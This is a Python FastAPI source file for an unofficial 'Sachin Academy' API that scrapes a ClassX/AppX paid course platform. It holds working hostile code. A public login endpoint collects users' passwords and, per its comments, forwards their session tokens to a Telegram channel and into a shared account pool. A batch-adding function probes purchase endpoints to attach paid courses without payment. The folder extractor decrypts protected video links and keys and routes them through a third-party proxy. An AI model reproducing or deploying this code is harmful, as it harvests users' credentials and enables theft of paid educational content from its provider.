"""
main.py  –  Sachin Academy Advanced API  v3.0
────────────────────────────────────────────────────────────────
Endpoints:
  /                           → Health check + endpoint map
  POST /api/user-login        → Public login → TG log → bot auto-add
  POST /api/login             → Seed account manual login
  GET  /api/pool-status       → Account pool overview
  GET  /api/my-batches        → All accounts' batches merged
  GET  /api/subjects          → Subjects for a course
  GET  /api/topics            → Topics for subject
  GET  /api/videos            → Videos list
  GET  /api/video-details     → Single video (optional AES decrypt)
  GET  /api/live-classes      → Live + upcoming classes
  GET  /api/course-details    → Course info by ID
  GET  /api/test-series       → Test series for course
  GET  /api/test-subjects     → Subjects inside a test series
  GET  /api/test-titles       → Test list inside a series
  GET  /api/test-terms        → Next.js test terms (auto build-id)
  GET  /api/folder-contents   → AppX folder recursive video extractor
"""

import json
import re
import asyncio
import aiohttp
import requests
from fastapi import FastAPI, HTTPException, Query
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from upstash_redis import Redis

from config import (
    BASE_URL, NEXT_BASE, COMMON_HEADERS,
    REDIS_URL, REDIS_TOKEN, SEED_ACCOUNTS, BUILD_ID_TTL
)
from auth import (
    perform_login, get_valid_auth, get_or_login_seed,
    get_all_dynamic_accounts, save_dynamic_account
)
from crypto import aes_decrypt, decode_b64, decrypt_video_data
from notifier import notify_user_login

# ─────────────────────────────────────────────
app = FastAPI(
    title="Sachin Academy Advanced API",
    description="Full-featured ClassX API — login pool, auto-bot sync, AES decrypt, test series",
    version="3.0.0",
    docs_url="/docs",
    redoc_url="/redoc"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

redis  = Redis(url=REDIS_URL, token=REDIS_TOKEN)
client = requests.Session()

# ─────────────────────────────────────────────
#  HELPERS
# ─────────────────────────────────────────────

import base64

def decode_token_userid(token: str) -> str:
    """Extract userid from JWT token without verification."""
    try:
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        data = json.loads(base64.urlsafe_b64decode(payload.encode()).decode())
        return str(
            data.get("id")
            or data.get("userid")
            or data.get("user_id")
            or data.get("sub")
        )
    except Exception:
        return ""


def auto_add_batch(token: str, userid: str, course_id: str):
    """Try multiple endpoints to auto attach batch."""
    headers = COMMON_HEADERS.copy()
    headers["Authorization"] = token
    headers["User-Id"] = str(userid)

    payload = {
        "course_id": str(course_id),
        "userid": str(userid)
    }

    endpoints = [
        "/post/addUserCourse",
        "/post/purchaseCourse",
        "/post/addtocourse",
        "/post/userPurchaseCourse"
    ]

    for ep in endpoints:
        try:
            r = client.post(
                BASE_URL + ep,
                headers=headers,
                data=payload,
                timeout=10
            )
            try:
                j = r.json()
            except Exception:
                continue

            if j.get("status") == 200 or j.get("success") is True:
                return {
                    "success": True,
                    "endpoint": ep,
                    "response": j
                }
        except Exception:
            continue

    return {"success": False}

def fetch_api(path: str, params: dict = None, auth: dict = None) -> dict:
    """Generic ClassX API GET with injected auth headers."""
    auth = auth or get_valid_auth()
    if not auth:
        raise HTTPException(status_code=401, detail="All accounts failed – no valid auth.")

    headers = COMMON_HEADERS.copy()
    headers["Authorization"] = auth["token"]
    headers["User-Id"]       = str(auth["userid"])

    try:
        resp = client.get(BASE_URL + path, headers=headers, params=params, timeout=15)
    except requests.RequestException as e:
        raise HTTPException(status_code=503, detail=f"Upstream request failed: {e}")

    if resp.status_code in (401, 403):
        raise HTTPException(status_code=401, detail="Token expired – re-login needed.")

    try:
        return resp.json()
    except Exception:
        raise HTTPException(status_code=502, detail="Upstream returned non-JSON.")


def get_next_build_id() -> str:
    """
    sachinacademy.classx.co.in homepage se Next.js buildId auto-detect karo.
    1-hour Redis cache.
    """
    cached = redis.get("next_build_id")
    if cached:
        return str(cached)
    try:
        resp = client.get(NEXT_BASE, headers=COMMON_HEADERS, timeout=10)
        m = re.search(r'"buildId"\s*:\s*"([^"]+)"', resp.text)
        if m:
            build_id = m.group(1)
            redis.set("next_build_id", build_id, ex=BUILD_ID_TTL)
            return build_id
    except Exception as e:
        print(f"[BUILD_ID] Failed to auto-detect: {e}")
    fallback = "eIZI8QCvje8FNahrTaPoC"
    return fallback


# ─────────────────────────────────────────────
#  APPX FOLDER EXTRACTOR  (from appex_v5.py)
# ─────────────────────────────────────────────

def _transform_vercel_url(url: str, course_id: str, folder_path_ids: str, item_id: str) -> str:
    """ClassX video URL → appxsignurl.vercel.app proxy URL"""
    from urllib.parse import urlparse
    parsed = urlparse(url)
    api_domain = urlparse(BASE_URL).netloc
    ext = "pdf" if ".pdf" in url.lower() else "m3u8"

    if folder_path_ids and folder_path_ids not in ("-1", ""):
        v_url = f"https://appxsignurl.vercel.app/appx/{api_domain}/{course_id}/{course_id}.{folder_path_ids}.{item_id}.{ext}"
    else:
        v_url = f"https://appxsignurl.vercel.app/appx/{api_domain}/{course_id}/{course_id}.{item_id}.{ext}"

    query = parsed.query
    if query:
        v_url += "?" + query
        if "appxv=3" not in query:
            v_url += "&appxv=3"
        if ext == "pdf" and "pdf=1" not in query:
            v_url += "&pdf=1"
    else:
        v_url += "?appxv=3"
        if ext == "pdf":
            v_url += "&pdf=1"
    return v_url


async def _fetch_json(session: aiohttp.ClientSession, url: str, headers: dict) -> dict | None:
    try:
        async with session.get(url, headers=headers) as r:
            text = await r.text()
        try:
            return json.loads(text)
        except json.JSONDecodeError:
            m = re.search(r'\{"status":', text, re.DOTALL)
            if m:
                s = text[m.start():]
                depth = 0
                for i, ch in enumerate(s):
                    depth += (1 if ch == "{" else -1 if ch == "}" else 0)
                    if depth == 0:
                        return json.loads(s[:i+1])
    except Exception:
        pass
    return None


async def _extract_item(session, course_id, folder_path_ids, item, headers, path_label) -> list[str]:
    fi = item.get("id")
    vt = item.get("Title", "")
    out = []
    try:
        r = await _fetch_json(
            session,
            f"{BASE_URL}/get/fetchVideoDetailsById?course_id={course_id}&folder_wise_course=1&ytflag=0&video_id={fi}",
            headers
        )
        if not r:
            return []
        data = r.get("data") or {}
        vt = data.get("Title", vt)
        dl = data.get("download_link", "")
        if dl:
            decrypted = aes_decrypt(dl)
            if ".pdf" not in decrypted:
                out.append(f"{path_label} {vt} : {_transform_vercel_url(decrypted, course_id, folder_path_ids, fi)}")
        else:
            for link in data.get("encrypted_links", []):
                a, k = link.get("path"), link.get("key")
                if a:
                    da = aes_decrypt(a)
                    v_url = _transform_vercel_url(da, course_id, folder_path_ids, fi)
                    if k:
                        k1 = aes_decrypt(k)
                        k2 = decode_b64(k1)
                        out.append(f"{path_label} {vt} : {v_url}*{k2}")
                    else:
                        out.append(f"{path_label} {vt} : {v_url}")
                    break
        if data.get("material_type") == "VIDEO":
            for pf, kf in [("pdf_link", "pdf_encryption_key"), ("pdf_link2", "pdf2_encryption_key")]:
                p = data.get(pf, "")
                k = data.get(kf, "")
                if p and k:
                    dp = aes_decrypt(p)
                    dk = aes_decrypt(k)
                    v_url = _transform_vercel_url(dp, course_id, folder_path_ids, fi)
                    suffix = f"*{dk}" if dk != "abcdefg" else ""
                    out.append(f"{path_label} {vt} (PDF) : {v_url}{suffix}")
    except Exception as e:
        out.append(f"[ERROR item {fi}: {e}]")
    return out


async def _extract_folder(session, course_id, folder_id, headers, path_label, folder_path_ids=None) -> list[str]:
    if folder_path_ids is None:
        folder_path_ids = str(folder_id)
    out = []
    try:
        j = await _fetch_json(
            session,
            f"{BASE_URL}/get/folder_contentsv2?course_id={course_id}&parent_id={folder_id}",
            headers
        )
        if not j:
            return out
        tasks = []
        for item in j.get("data", []):
            mt = item.get("material_type")
            tasks.append(_extract_item(session, course_id, folder_path_ids, item, headers, path_label))
            if mt == "FOLDER":
                fn = item.get("Title", "Folder")
                new_path = f"{path_label} >> {fn}"
                new_fp   = f"{folder_path_ids}.{item['id']}"
                tasks.append(_extract_folder(session, course_id, item["id"], headers, new_path, new_fp))
        results = await asyncio.gather(*tasks)
        for res in results:
            if res:
                out.extend(res)
    except Exception as e:
        out.append(f"[ERROR folder {folder_id}: {e}]")
    return out


async def extract_course_folder_contents(course_id: str, auth: dict) -> list[str]:
    """
    Full async recursive extraction – root folder -1 se shuru.
    appex_v5.py ke v2_new logic ko API mein laaya gaya.
    """
    headers = COMMON_HEADERS.copy()
    headers["Authorization"] = auth["token"]
    headers["User-Id"]       = str(auth["userid"])

    all_out = []
    async with aiohttp.ClientSession() as session:
        j = await _fetch_json(
            session,
            f"{BASE_URL}/get/folder_contentsv2?course_id={course_id}&parent_id=-1",
            headers
        )
        if not j or not j.get("data"):
            return []

        tasks = []
        for item in j["data"]:
            name = item.get("Title", "Root")
            path_label = f"[Sachin Academy >> Course-{course_id} >> {name}]"
            tasks.append(_extract_item(session, course_id, "", item, headers, path_label))
            if item.get("material_type") == "FOLDER":
                tasks.append(_extract_folder(session, course_id, item["id"], headers, path_label, str(item["id"])))

        results = await asyncio.gather(*tasks)
        for res in results:
            if res:
                all_out.extend(res)
    return all_out


# ─────────────────────────────────────────────
#  REQUEST MODELS
# ─────────────────────────────────────────────

class UserLoginRequest(BaseModel):
    identifier: str  # email OR phone
    password: str


class TokenLoginRequest(BaseModel):
    token: str


# ─────────────────────────────────────────────
#  ROUTES
# ─────────────────────────────────────────────

@app.get("/", tags=["Root"])
def home():
    return {
        "status": "active",
        "api": "Sachin Academy Advanced API v3.0",
        "dev": "Maxx Papa",
        "endpoints": {
            "auth":        ["/api/user-login (POST)", "/api/login (POST)", "/api/pool-status (GET)"],
            "courses":     ["/api/my-batches", "/api/subjects", "/api/topics", "/api/videos",
                            "/api/video-details", "/api/live-classes", "/api/course-details"],
            "test_series": ["/api/test-series", "/api/test-subjects", "/api/test-titles", "/api/test-terms"],
            "advanced":    ["/api/folder-contents"]
        }
    }


# ── USER LOGIN (public facing) ────────────────
@app.post("/api/user-login", tags=["Auth"])
async def user_login(req: UserLoginRequest):
    """
    Public login endpoint.
    - Authenticates with ClassX
    - Sends full login JSON to Telegram log channel
    - Bot reads channel → auto-adds account to Redis pool
    """
    payload = {
        "source":       (None, "website"),
        "phone":        (None, req.identifier),
        "email":        (None, req.identifier),
        "password":     (None, req.password),
        "extra_details":(None, "1"),
    }
    try:
        resp = client.post(
            f"{BASE_URL}/post/userLogin?extra_details=0",
            headers=COMMON_HEADERS,
            files=payload,
            timeout=15
        )
    except requests.RequestException as e:
        raise HTTPException(status_code=503, detail=f"Upstream unreachable: {e}")

    login_json = resp.json()

    if resp.status_code == 200 and login_json.get("status") == 200:
        d      = login_json["data"]
        token  = d["token"]
        userid = str(d["userid"])
        phone  = str(d.get("phone", req.identifier))

        # ✅ FIX: dynaccount:userid se directly save karo
        # get_all_dynamic_accounts() dynaccount:* scan karta hai
        # Yeh call MISSING tha v3 mein — isliye batch add nahi hota tha
        save_dynamic_account({
            "userid": userid,
            "token":  token,
            "name":   d.get("name", "Unknown"),
            "email":  d.get("email", ""),
            "phone":  phone,
        })

        # Legacy cache (seed logic ke liye)
        redis.set(f"token:{req.identifier}",  token,  ex=86400)
        redis.set(f"userid:{req.identifier}", userid)

        # TG channel pe log + #SYNC_ACCOUNT# message bhejo (background)
        asyncio.create_task(notify_user_login(login_json))

        return {
            "status":  200,
            "message": "Login successful",
            "data": {
                "userid":   userid,
                "token":    token,
                "name":     d.get("name"),
                "email":    d.get("email"),
                "phone":    phone,
                "state":    d.get("state"),
                "is_paid":  d.get("is_paid_user"),
            }
        }

    return {
        "status":  login_json.get("status", 401),
        "message": login_json.get("message", "Login failed"),
        "raw":     login_json
    }



@app.post("/api/token-login", tags=["Auth"])
async def token_login(req: TokenLoginRequest):
    """Login using direct token."""
    userid = decode_token_userid(req.token)

    if not userid:
        raise HTTPException(status_code=400, detail="Invalid token")

    redis.set(f"token:{userid}", req.token, ex=86400)
    redis.set(f"userid:{userid}", userid)

    save_dynamic_account({
        "userid": userid,
        "token": req.token,
        "phone": userid,
        "name": "Token Login"
    })

    return {
        "status": 200,
        "message": "Token login successful",
        "data": {
            "userid": userid,
            "token": req.token
        }
    }


@app.post("/api/auto-add-batch", tags=["Auth"])
async def auto_add_batch_api(token: str, course_id: str):
    """Automatically attach batch after login."""
    userid = decode_token_userid(token)

    if not userid:
        raise HTTPException(status_code=400, detail="Invalid token")

    result = auto_add_batch(token, userid, course_id)

    headers = COMMON_HEADERS.copy()
    headers["Authorization"] = token
    headers["User-Id"] = userid

    verify = client.get(
        f"{BASE_URL}/get/mycoursev2?userid={userid}",
        headers=headers,
        timeout=15
    )

    batches = verify.json().get("data", [])

    exists = any(str(x.get("id")) == str(course_id) for x in batches)

    return {
        "status": 200 if exists else 400,
        "success": exists,
        "userid": userid,
        "course_id": course_id,
        "batch_added": exists,
        "auto_add_result": result,
        "total_batches": len(batches)
    }


# ── SEED LOGIN (internal) ─────────────────────
@app.post("/api/login", tags=["Auth"])
def seed_login(phone: str, password: str):
    """Seed account manually refresh/add karo."""
    auth = perform_login(phone, password)
    if auth:
        return {
            "status":  "success",
            "message": "Logged in and token cached",
            "data":    {"token": auth["token"], "userid": auth["userid"], "phone": auth["phone"]}
        }
    raise HTTPException(status_code=401, detail="Login failed")


# ── POOL STATUS ───────────────────────────────
@app.get("/api/pool-status", tags=["Auth"])
def pool_status():
    """Account pool ka full status."""
    seed_info = []
    for acc in SEED_ACCOUNTS:
        token  = redis.get(f"token:{acc['phone']}")
        userid = redis.get(f"userid:{acc['phone']}")
        seed_info.append({
            "phone":        acc["phone"],
            "token_cached": bool(token),
            "userid":       str(userid) if userid else None
        })

    dyn = get_all_dynamic_accounts()

    return {
        "status":                  200,
        "seed_accounts":           seed_info,
        "dynamic_accounts_count":  len(dyn),
        "dynamic_accounts":        [
            {
                "userid": a.get("userid"),
                "name":   a.get("name", "N/A"),
                "phone":  a.get("phone", "N/A"),
                "email":  a.get("email", "N/A")
            }
            for a in dyn
        ]
    }


# ── MY BATCHES ────────────────────────────────
@app.get("/api/my-batches", tags=["Courses"])
def get_all_merged_batches():
    """
    Seed accounts + dynamic accounts ke saare batches ek list mein.
    Bot se auto-added accounts bhi include hote hain.
    """
    combined = []
    seen_ids = set()

    # 1) Seed accounts
    for acc in SEED_ACCOUNTS:
        auth = get_or_login_seed(acc)
        if not auth:
            continue
        result = fetch_api("/get/mycourseweb", {"userid": auth["userid"]}, auth)
        if isinstance(result, dict) and result.get("status") == 200:
            for batch in result.get("data", []):
                bid = str(batch.get("id") or batch.get("course_id"))
                if bid not in seen_ids:
                    batch["_source"] = f"seed:{acc['phone']}"
                    combined.append(batch)
                    seen_ids.add(bid)

    # 2) Dynamic accounts
    for acc in get_all_dynamic_accounts():
        t, u = acc.get("token"), acc.get("userid")
        if not t or not u:
            continue
        result = fetch_api("/get/mycourseweb", {"userid": str(u)}, {"token": t, "userid": str(u)})
        if isinstance(result, dict) and result.get("status") == 200:
            for batch in result.get("data", []):
                bid = str(batch.get("id") or batch.get("course_id"))
                if bid not in seen_ids:
                    batch["_source"] = f"dynamic:{acc.get('name', u)}"
                    combined.append(batch)
                    seen_ids.add(bid)

    return {
        "status":  200,
        "message": f"All Batches Merged",
        "total":   len(combined),
        "data":    combined
    }


# ── SUBJECTS ──────────────────────────────────
@app.get("/api/subjects", tags=["Courses"])
def get_subjects(courseid: str = Query(..., description="Course ID")):
    return fetch_api("/get/allsubjectfrmlivecourseclass", {"courseid": courseid})


# ── TOPICS ────────────────────────────────────
@app.get("/api/topics", tags=["Courses"])
def get_topics(
    courseid:  str = Query(...),
    subjectid: str = Query(...)
):
    return fetch_api("/get/alltopicfrmlivecourseclass", {
        "courseid":  courseid,
        "subjectid": subjectid,
        "start":     "-1"
    })


# ── VIDEOS ────────────────────────────────────
@app.get("/api/videos", tags=["Courses"])
def get_videos(
    courseid:  str = Query(...),
    subjectid: str = Query(...),
    topicid:   str = Query(...)
):
    return fetch_api("/get/livecourseclassbycoursesubtopconceptapiv3", {
        "courseid":  courseid,
        "subjectid": subjectid,
        "topicid":   topicid,
        "conceptid": "",
        "windowsapp":"false",
        "start":     "0"
    })


# ── VIDEO DETAILS (+ optional AES decrypt) ────
@app.get("/api/video-details", tags=["Courses"])
def get_video_details(
    courseid: str = Query(...),
    videoid:  str = Query(...),
    decrypt:  bool = Query(False, description="AES decrypt all encrypted fields")
):
    params = {
        "course_id":         courseid,
        "video_id":          videoid,
        "ytflag":            "0",
        "folder_wise_course":"0"
    }
    result = fetch_api("/get/fetchVideoDetailsById", params)
    if decrypt and isinstance(result, dict) and result.get("status") == 200:
        result["data"] = decrypt_video_data(result.get("data", {}))
    return result


# ── LIVE / UPCOMING CLASSES ───────────────────
@app.get("/api/live-classes", tags=["Courses"])
def get_live_classes(
    courseid: str = Query(..., description="Course ID e.g. 360"),
    start:    str = Query("-1")
):
    """Live aur upcoming classes for a course."""
    return fetch_api("/get/live_upcoming_course_classv2", {
        "courseid": courseid,
        "start":    start
    })


# ── COURSE DETAILS ────────────────────────────
@app.get("/api/course-details", tags=["Courses"])
def get_course_details(id: str = Query(..., description="Course ID")):
    """Full course info by ID."""
    return fetch_api("/get/course_by_id", {"id": id})


# ── TEST SERIES BY COURSE ─────────────────────
@app.get("/api/test-series", tags=["Test Series"])
def get_test_series(
    courseid:           str = Query(...),
    start:              str = Query("-1"),
    folder_wise_course: str = Query("0")
):
    """Course ke saare test series."""
    auth = get_valid_auth()
    if not auth:
        raise HTTPException(status_code=401, detail="Auth failed")
    return fetch_api("/get/test_seriesbycourseid", {
        "courseid":           courseid,
        "userid":             auth["userid"],
        "folder_wise_course": folder_wise_course,
        "start":              start
    }, auth)


# ── TEST SERIES SUBJECTS ──────────────────────
@app.get("/api/test-subjects", tags=["Test Series"])
def get_test_subjects(testseries_id: str = Query(...)):
    """Ek test series ke subjects."""
    return fetch_api("/get/testseries_subjects", {"testseries_id": testseries_id})


# ── TEST TITLES ───────────────────────────────
@app.get("/api/test-titles", tags=["Test Series"])
def get_test_titles(
    testseriesid: str = Query(...),
    subject_id:   str = Query("-1"),
    search:       str = Query(""),
    start:        str = Query("-1")
):
    """Test series ke andar test list."""
    auth = get_valid_auth()
    if not auth:
        raise HTTPException(status_code=401, detail="Auth failed")
    return fetch_api("/get/test_titlev2", {
        "testseriesid": testseriesid,
        "subject_id":   subject_id,
        "userid":       auth["userid"],
        "search":       search,
        "start":        start
    }, auth)


# ── TEST TERMS  (Next.js route) ───────────────
@app.get("/api/test-terms", tags=["Test Series"])
def get_test_terms(
    test_id:        str = Query(..., description="testId e.g. 3132"),
    test_series_id: str = Query(..., description="id/series e.g. 148"),
    test_pass_url:  str = Query("", description="testPassUrl param (optional)")
):
    """
    Next.js /_next/data route proxy.
    BuildId auto-detect karta hai – stale hone par auto-refresh.
    """
    def _call(build_id: str):
        url = (
            f"{NEXT_BASE}/_next/data/{build_id}/"
            f"test-series/{test_series_id}/test-kvs/{test_id}/terms.json"
            f"?testPassUrl={test_pass_url}&id={test_series_id}&testId={test_id}"
        )
        headers = {**COMMON_HEADERS, "Accept": "application/json", "x-nextjs-data": "1"}
        return client.get(url, headers=headers, timeout=15)

    build_id = get_next_build_id()
    resp = _call(build_id)

    if resp.status_code == 404:
        # Build ID stale – refresh karke retry
        redis.delete("next_build_id")
        build_id = get_next_build_id()
        resp = _call(build_id)

    if resp.status_code != 200:
        raise HTTPException(status_code=resp.status_code, detail=f"Upstream returned {resp.status_code}")

    try:
        return resp.json()
    except Exception:
        raise HTTPException(status_code=502, detail="Non-JSON response from Next.js route")


# ── FOLDER CONTENTS EXTRACTOR ─────────────────
@app.get("/api/folder-contents", tags=["Advanced"])
async def get_folder_contents(
    courseid: str = Query(..., description="Course ID to extract all videos from")
):
    """
    AppX folder-contentsv2 recursive extractor.
    AES decrypt + vercel proxy URL generation included.
    Returns flat list of  [folder_path video_title : url(*key)]
    """
    auth = get_valid_auth()
    if not auth:
        raise HTTPException(status_code=401, detail="Auth failed")

    lines = await extract_course_folder_contents(courseid, auth)
    return {
        "status":     200,
        "courseid":   courseid,
        "total_items": len(lines),
        "data":       lines
    }
